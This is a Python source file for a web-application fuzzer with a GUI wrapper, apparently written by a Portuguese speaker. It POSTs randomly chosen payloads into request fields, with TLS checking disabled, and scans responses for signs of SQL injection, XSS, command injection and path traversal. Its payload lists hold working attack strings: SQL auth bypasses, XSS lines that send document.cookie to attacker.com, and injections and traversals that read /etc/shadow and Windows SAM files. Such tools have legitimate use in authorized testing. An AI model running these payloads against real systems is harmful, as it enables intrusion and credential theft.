import time
import requests
import json
from urllib.parse import urlparse, urljoin
import random
import string
import socket
import dns.resolver

def resolve_domain(domain):
    """Resolve domain to IP address"""
    try:
        # Try DNS resolution
        answers = dns.resolver.resolve(domain, 'A')
        return answers[0].to_text()
    except:
        try:
            # Fallback to socket
            return socket.gethostbyname(domain)
        except:
            return None

def generate_payload(template, fuzz_type):
    """Gera payloads baseados no template e tipo de fuzzing"""
    if fuzz_type == "SQL Injection":
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "') OR (('1'='1",
            "')) OR (('1'='1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' OR 1=1--",
            "' OR 'x'='x",
            "' OR 1=1#",
            "' OR 'x'='x'#",
            "' OR 1=1/*",
            "' OR 'x'='x'/*",
            "') OR ('1'='1",
            "') OR ('x'='x",
            "')) OR (('1'='1",
            "')) OR (('x'='x"
        ]
        return random.choice(payloads)
    
    elif fuzz_type == "XSS":
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)//",
            "<img src=x onerror=alert(1)/>",
            "<img src=x onerror=alert(1)>//",
            "<img src=x onerror=alert(1)>/>",
            "<img src=x onerror=alert(1)>//>",
            "<img src=x onerror=alert(1)>/>",
            "<img src=x onerror=alert(1)>//>",
            "<img src=x onerror=alert(1)>/>",
            "<img src=x onerror=alert(1)>//>",
            "<img src=x onerror=alert(1)>/>",
            "<img src=x onerror=alert(1)>//>"
        ]
        return random.choice(payloads)
    
    elif fuzz_type == "Command Injection":
        payloads = [
            "; ls",
            "& dir",
            "| cat /etc/passwd",
            "`id`",
            "$(id)",
            "; whoami",
            "& net user",
            "| whoami",
            "; cat /etc/passwd",
            "& type C:\\Windows\\win.ini",
            "| cat /etc/shadow",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; cat /etc/shadow",
            "& type C:\\Windows\\System32\\config\\SAM",
            "| cat /etc/gshadow",
            "`cat /etc/shadow`",
            "$(cat /etc/shadow)",
            "; cat /etc/gshadow",
            "& type C:\\Windows\\System32\\config\\SECURITY"
        ]
        return random.choice(payloads)
    
    elif fuzz_type == "Path Traversal":
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "../../../etc/shadow",
            "..\\..\\..\\windows\\System32\\config\\SAM",
            "....//....//....//etc/shadow",
            "..%2f..%2f..%2fetc/shadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow",
            "..%252f..%252f..%252fetc/shadow",
            "../../../etc/gshadow",
            "..\\..\\..\\windows\\System32\\config\\SECURITY",
            "....//....//....//etc/gshadow",
            "..%2f..%2f..%2fetc/gshadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/gshadow",
            "..%252f..%252f..%252fetc/gshadow"
        ]
        return random.choice(payloads)
    
    else:  # Default/Generic
        return f"{template}-{random.randint(1, 1000)}"

def parse_headers_body(headers_body):
    """Parse headers and body from input text"""
    try:
        # Try to parse as JSON first
        data = json.loads(headers_body)
        headers = data.get('headers', {})
        body = data.get('body', {})
    except:
        # If not JSON, try to parse as text
        parts = headers_body.split('\n\n', 1)
        headers_text = parts[0]
        body = parts[1] if len(parts) > 1 else ""
        
        # Parse headers
        headers = {}
        for line in headers_text.split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
    
    return headers, body

def inject_payload(data, payload, injection_point):
    """Inject payload into data at specified point"""
    if isinstance(data, dict):
        for key in data:
            if isinstance(data[key], (dict, list)):
                data[key] = inject_payload(data[key], payload, injection_point)
            elif isinstance(data[key], str):
                if injection_point in key or injection_point == '*':
                    data[key] = payload
    elif isinstance(data, list):
        for i in range(len(data)):
            if isinstance(data[i], (dict, list)):
                data[i] = inject_payload(data[i], payload, injection_point)
            elif isinstance(data[i], str):
                if injection_point == '*':
                    data[i] = payload
    return data

def run_fuzzer(endpoint, headers, body, fuzz_type, template, log_callback, result_callback):
    """Execute fuzzing attack with real payloads"""
    log_callback(f"[INFO] Iniciando fuzzing {fuzz_type} em {endpoint}")
    
    # Parse headers and body
    headers, body = parse_headers_body(headers)
    
    # Resolve domain
    parsed_url = urlparse(endpoint)
    domain = parsed_url.netloc
    ip = resolve_domain(domain)
    
    if not ip:
        log_callback(f"[ERROR] Não foi possível resolver o domínio {domain}")
        result_callback({'status': 'error', 'message': f'Domain resolution failed: {domain}'})
        return
        
    # Update endpoint with IP
    endpoint = endpoint.replace(domain, ip)
    log_callback(f"[INFO] Endpoint resolvido para IP: {ip}")
    
    # Injection points to test
    injection_points = ['*', 'id', 'user', 'username', 'password', 'email', 'token', 'key', 'query', 'search', 'input']
    
    results = []
    for point in injection_points:
        if isinstance(result_callback, dict) and result_callback.get('stop_flag', False):
            log_callback("[INFO] Fuzzing interrompido pelo usuário")
            break
            
        payload = generate_payload(template, fuzz_type)
        log_callback(f"[INFO] Testando payload em {point}: {payload}")
        
        try:
            # Prepare request data
            test_headers = headers.copy()
            test_body = body.copy() if isinstance(body, dict) else body
            
            # Inject payload
            if isinstance(test_body, dict):
                test_body = inject_payload(test_body, payload, point)
            else:
                test_body = payload
                
            # Make request
            response = requests.post(
                endpoint,
                headers=test_headers,
                json=test_body if isinstance(test_body, dict) else None,
                data=None if isinstance(test_body, dict) else test_body,
                timeout=10,
                verify=False  # Disable SSL verification for testing
            )
            
            # Analyze response
            if response.status_code != 200:
                log_callback(f"[INFO] Resposta não-200: {response.status_code}")
                results.append({
                    'point': point,
                    'payload': payload,
                    'status': response.status_code,
                    'response': response.text[:200]  # First 200 chars
                })
                
            # Check for potential vulnerabilities
            if fuzz_type == "SQL Injection" and any(err in response.text.lower() for err in ['sql', 'mysql', 'postgresql', 'oracle', 'syntax']):
                log_callback(f"[VULNERABILITY] Possível SQL Injection em {point}")
                results.append({
                    'point': point,
                    'payload': payload,
                    'type': 'SQL Injection',
                    'evidence': response.text[:200]
                })
                
            elif fuzz_type == "XSS" and payload in response.text:
                log_callback(f"[VULNERABILITY] Possível XSS em {point}")
                results.append({
                    'point': point,
                    'payload': payload,
                    'type': 'XSS',
                    'evidence': response.text[:200]
                })
                
            elif fuzz_type == "Command Injection" and any(err in response.text.lower() for err in ['root:', 'uid=', 'gid=', 'groups=']):
                log_callback(f"[VULNERABILITY] Possível Command Injection em {point}")
                results.append({
                    'point': point,
                    'payload': payload,
                    'type': 'Command Injection',
                    'evidence': response.text[:200]
                })
                
            elif fuzz_type == "Path Traversal" and any(err in response.text.lower() for err in ['root:', '/bin/bash', '/etc/passwd', 'win.ini']):
                log_callback(f"[VULNERABILITY] Possível Path Traversal em {point}")
                results.append({
                    'point': point,
                    'payload': payload,
                    'type': 'Path Traversal',
                    'evidence': response.text[:200]
                })
                
        except Exception as e:
            log_callback(f"[ERROR] Erro ao testar {point}: {str(e)}")
            results.append({
                'point': point,
                'payload': payload,
                'error': str(e)
            })
            
        time.sleep(0.5)  # Rate limiting
        
    if isinstance(result_callback, dict):
        result_callback['callback']({
            'status': 'complete',
            'results': results
        })
    else:
        result_callback({
            'status': 'complete',
            'results': results
        })

def run_advanced_fuzzing(endpoint, headers_body, fuzz_type, template, log_callback, progress_callback, stop_flag):
    """Wrapper for advanced fuzzing expected by GUI"""
    try:
        # Validate endpoint
        if not endpoint.startswith(('http://', 'https://')):
            endpoint = 'https://' + endpoint
            
        # Count total test cases
        injection_points = ['*', 'id', 'user', 'username', 'password', 'email', 'token', 'key', 'query', 'search', 'input']
        total_tests = len(injection_points)
        current_test = 0
        
        def progress_wrapper(val):
            nonlocal current_test
            current_test += 1
            progress = int((current_test / total_tests) * 100)
            progress_callback(progress)
            
        def result_wrapper(result):
            if result.get('status') == 'complete':
                log_callback(f"[INFO] Fuzzing concluído. {len(result.get('results', []))} resultados encontrados.")
            else:
                log_callback(f"[INFO] Fuzzing finalizado com status: {result.get('status')}")
                
        # Run fuzzer with progress tracking
        run_fuzzer(
            endpoint,
            headers_body,
            headers_body,
            fuzz_type,
            template,
            lambda msg: (log_callback(msg), progress_wrapper(0)),
            {'stop_flag': stop_flag, 'callback': result_wrapper}
        )
        
    except Exception as e:
        log_callback(f"[ERROR] Erro no fuzzing: {str(e)}")
    finally:
        progress_callback(100) 